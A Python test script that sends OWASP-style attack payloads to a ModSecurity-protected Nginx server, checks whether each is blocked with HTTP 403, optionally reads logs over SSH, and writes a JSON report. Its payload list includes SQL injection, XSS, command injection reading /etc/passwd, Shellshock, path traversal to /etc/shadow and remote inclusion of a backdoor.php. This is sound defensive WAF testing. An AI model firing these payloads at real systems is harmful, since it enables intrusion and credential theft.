#!/usr/bin/env python3
"""
Web Server & WAF Attack Testing System
======================================
Executes a curated suite of baseline requests and OWASP Top 10 attack simulations
against the protected Nginx + ModSecurity (OWASP CRS) web server, verifies HTTP
blocking responses, optionally inspects remote ModSecurity/Wazuh logs via SSH,
and exports a structured JSON report.

Usage:
    python3 scripts/test_web_attacks.py
    python3 scripts/test_web_attacks.py --target http://130.210.70.6 --verify-logs
    python3 scripts/test_web_attacks.py --category sqli
"""

import argparse
import datetime
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import asdict, dataclass, field
from typing import Dict, List, Optional


@dataclass
class AttackCase:
    id: str
    category: str
    name: str
    method: str
    path: str
    params: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    expected_blocked: bool = True
    crs_rule_hint: str = ""


@dataclass
class AttackResult:
    id: str
    category: str
    name: str
    url: str
    method: str
    http_status: int
    expected_blocked: bool
    actual_blocked: bool
    passed: bool
    latency_ms: float
    crs_rule_hint: str
    error: Optional[str] = None


TEST_CASES: List[AttackCase] = [
    # 1. Baseline Legitimate Traffic
    AttackCase(
        id="BASE-01",
        category="baseline",
        name="Normal Homepage GET",
        method="GET",
        path="/",
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0"},
        expected_blocked=False,
        crs_rule_hint="None (Legitimate)",
    ),
    AttackCase(
        id="BASE-02",
        category="baseline",
        name="Normal Query Parameter",
        method="GET",
        path="/",
        params={"page": "about", "lang": "en"},
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0"},
        expected_blocked=False,
        crs_rule_hint="None (Legitimate)",
    ),
    # 2. SQL Injection (SQLi)
    AttackCase(
        id="SQLI-01",
        category="sqli",
        name="UNION SELECT Credential Extraction",
        method="GET",
        path="/",
        params={"id": "1' UNION SELECT null,username,password FROM users--"},
        expected_blocked=True,
        crs_rule_hint="942100 / 942190 (SQLi)",
    ),
    AttackCase(
        id="SQLI-02",
        category="sqli",
        name="Boolean Auth Bypass Tautology",
        method="GET",
        path="/",
        params={"user": "admin' OR '1'='1"},
        expected_blocked=True,
        crs_rule_hint="942100 (SQLi libinjection)",
    ),
    AttackCase(
        id="SQLI-03",
        category="sqli",
        name="Time-Based Blind SQLi (SLEEP)",
        method="GET",
        path="/",
        params={"q": "1' AND SLEEP(5)--"},
        expected_blocked=True,
        crs_rule_hint="942100 / 942160 (Blind SQLi)",
    ),
    # 3. Cross-Site Scripting (XSS)
    AttackCase(
        id="XSS-01",
        category="xss",
        name="Reflected Script Tag Injection",
        method="GET",
        path="/",
        params={"search": "<script>alert(document.cookie)</script>"},
        expected_blocked=True,
        crs_rule_hint="941100 / 941110 (XSS)",
    ),
    AttackCase(
        id="XSS-02",
        category="xss",
        name="IMG OnError Event Handler XSS",
        method="GET",
        path="/",
        params={"avatar": "<img src=x onerror=alert(1)>"},
        expected_blocked=True,
        crs_rule_hint="941100 / 941160 (NoScript XSS)",
    ),
    # 4. Remote Command Execution (RCE)
    AttackCase(
        id="RCE-01",
        category="rce",
        name="Unix Command Chaining (/etc/passwd)",
        method="GET",
        path="/",
        params={"cmd": "; cat /etc/passwd"},
        expected_blocked=True,
        crs_rule_hint="932100 / 932160 (Unix RCE)",
    ),
    AttackCase(
        id="RCE-02",
        category="rce",
        name="Subshell Execution ($(whoami))",
        method="GET",
        path="/",
        params={"ping": "127.0.0.1 && $(/bin/sh -c id)"},
        expected_blocked=True,
        crs_rule_hint="932105 / 932150 (Command Injection)",
    ),
    AttackCase(
        id="RCE-03",
        category="rce",
        name="Shellshock Bash Env Header Attack",
        method="GET",
        path="/",
        headers={"User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"},
        expected_blocked=True,
        crs_rule_hint="932170 (Shellshock)",
    ),
    # 5. Local / Remote File Inclusion & Path Traversal (LFI / RFI)
    AttackCase(
        id="LFI-01",
        category="lfi",
        name="Dot-Dot-Slash Path Traversal",
        method="GET",
        path="/",
        params={"file": "../../../../etc/shadow"},
        expected_blocked=True,
        crs_rule_hint="930100 / 930120 (LFI)",
    ),
    AttackCase(
        id="RFI-01",
        category="lfi",
        name="Remote Malicious Payload Inclusion",
        method="GET",
        path="/",
        params={"include": "http://198.51.100.99/backdoor.php"},
        expected_blocked=True,
        crs_rule_hint="931130 (RFI)",
    ),
    # 6. Automated Security Scanners & Bots
    AttackCase(
        id="SCAN-01",
        category="scanner",
        name="SQLMap Automated Scanner Fingerprint",
        method="GET",
        path="/",
        headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"},
        expected_blocked=True,
        crs_rule_hint="913100 (Security Scanner)",
    ),
    AttackCase(
        id="SCAN-02",
        category="scanner",
        name="Nikto Web Vulnerability Scanner",
        method="GET",
        path="/",
        headers={"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"},
        expected_blocked=True,
        crs_rule_hint="913100 (Security Scanner)",
    ),
]


def run_single_test(base_url: str, case: AttackCase, timeout: float = 8.0) -> AttackResult:
    url = base_url.rstrip("/") + case.path
    if case.params:
        query_string = urllib.parse.urlencode(case.params)
        url = f"{url}?{query_string}"

    headers = {"User-Agent": "SOC-Attack-Tester/1.0"}
    headers.update(case.headers)

    data = case.body.encode("utf-8") if case.body else None
    req = urllib.request.Request(url=url, data=data, headers=headers, method=case.method)

    start = time.perf_counter()
    http_status = 0
    err_msg = None

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            http_status = resp.getcode()
    except urllib.error.HTTPError as e:
        http_status = e.code
    except Exception as e:
        err_msg = str(e)

    latency_ms = round((time.perf_counter() - start) * 1000.0, 2)
    actual_blocked = http_status == 403
    passed = (actual_blocked == case.expected_blocked) and (http_status != 0)

    return AttackResult(
        id=case.id,
        category=case.category,
        name=case.name,
        url=url,
        method=case.method,
        http_status=http_status,
        expected_blocked=case.expected_blocked,
        actual_blocked=actual_blocked,
        passed=passed,
        latency_ms=latency_ms,
        crs_rule_hint=case.crs_rule_hint,
        error=err_msg,
    )


def verify_remote_waf_logs(host_ip: str, ssh_key: str) -> List[Dict[str, str]]:
    """Connects to web-server via SSH and parses recent ModSecurity blocks from Nginx error.log."""
    cmd = [
        "ssh",
        "-i",
        os.path.expanduser(ssh_key),
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "ConnectTimeout=8",
        f"ubuntu@{host_ip}",
        "sudo tail -n 25 /var/log/nginx/error.log",
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        return [{"error": proc.stderr.strip() or "SSH connection failed"}]

    parsed_events = []
    for line in proc.stdout.splitlines():
        if "ModSecurity: Access denied" not in line:
            continue
        rule_id = re.search(r'\[id "(\d+)"\]', line)
        msg = re.search(r'\[msg "([^"]+)"\]', line)
        req = re.search(r'request: "([^"]+)"', line)
        client = re.search(r'client: ([^,]+)', line)
        parsed_events.append(
            {
                "client": client.group(1) if client else "unknown",
                "rule_id": rule_id.group(1) if rule_id else "unknown",
                "message": msg.group(1) if msg else "Access denied",
                "request": req.group(1) if req else "",
            }
        )
    return parsed_events


def print_table(results: List[AttackResult]) -> None:
    GREEN = "\033[92m"
    RED = "\033[91m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    print("\n" + "=" * 105)
    print(
        f"{'ID':<9} {'CATEGORY':<10} {'ATTACK / TEST NAME':<38} {'HTTP':<6} {'ACTION':<12} {'LATENCY':<10} {'RESULT'}"
    )
    print("=" * 105)

    for r in results:
        action = f"{YELLOW}BLOCKED{RESET}" if r.actual_blocked else f"{CYAN}ALLOWED{RESET}"
        status_badge = f"{GREEN}PASS{RESET}" if r.passed else f"{RED}FAIL{RESET}"
        print(
            f"{r.id:<9} {r.category:<10} {r.name[:37]:<38} {r.http_status:<6} {action:<21} {f'{r.latency_ms}ms':<10} {status_badge}"
        )

    print("=" * 105)
    passed_count = sum(1 for r in results if r.passed)
    blocked_attacks = sum(1 for r in results if r.expected_blocked and r.actual_blocked)
    total_attacks = sum(1 for r in results if r.expected_blocked)
    print(
        f"Summary: {passed_count}/{len(results)} checks passed | "
        f"{blocked_attacks}/{total_attacks} malicious payloads blocked (HTTP 403)"
    )
    print("=" * 105 + "\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="SOC Web Server & WAF Attack Testing Suite")
    parser.add_argument(
        "--target",
        default=os.environ.get("WEB_TARGET_URL", "http://130.210.70.6"),
        help="Target web server base URL (default: http://130.210.70.6)",
    )
    parser.add_argument(
        "--category",
        default="all",
        choices=["all", "baseline", "sqli", "xss", "rce", "lfi", "scanner"],
        help="Filter test cases by category",
    )
    parser.add_argument(
        "--verify-logs",
        action="store_true",
        help="SSH into the web server and verify ModSecurity/Wazuh audit log entries",
    )
    parser.add_argument(
        "--ssh-key",
        default="~/.ssh/soc-automation-ed25519",
        help="Path to SSH key for --verify-logs",
    )
    parser.add_argument(
        "--json-out",
        default="evidence/waf_attack_test_report.json",
        help="Path to save JSON evidence report",
    )
    args = parser.parse_args()

    selected = [
        c for c in TEST_CASES if args.category == "all" or c.category == args.category
    ]

    print(f"[*] Target Web Server : {args.target}")
    print(f"[*] Selected Category : {args.category} ({len(selected)} test cases)")

    results: List[AttackResult] = []
    for case in selected:
        res = run_single_test(args.target, case)
        results.append(res)

    print_table(results)

    remote_logs: List[Dict[str, str]] = []
    if args.verify_logs:
        parsed_host = urllib.parse.urlparse(args.target).hostname or "130.210.70.6"
        print(f"[*] Inspecting remote ModSecurity logs on {parsed_host} via SSH...")
        remote_logs = verify_remote_waf_logs(parsed_host, args.ssh_key)
        for idx, entry in enumerate(remote_logs[-10:], 1):
            if "error" in entry:
                print(f"    [!] Log verification error: {entry['error']}")
            else:
                print(
                    f"    [{idx:02d}] Rule {entry['rule_id']} | {entry['message']} | Req: {entry['request']}"
                )
        print()

    if args.json_out:
        os.makedirs(os.path.dirname(args.json_out), exist_ok=True)
        report = {
            "timestamp_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "target": args.target,
            "total_tests": len(results),
            "passed_tests": sum(1 for r in results if r.passed),
            "attacks_blocked": sum(1 for r in results if r.expected_blocked and r.actual_blocked),
            "results": [asdict(r) for r in results],
            "remote_waf_log_sample": remote_logs[-15:],
        }
        with open(args.json_out, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"[+] Saved attack test evidence report to: {args.json_out}")

    return 0 if all(r.passed for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
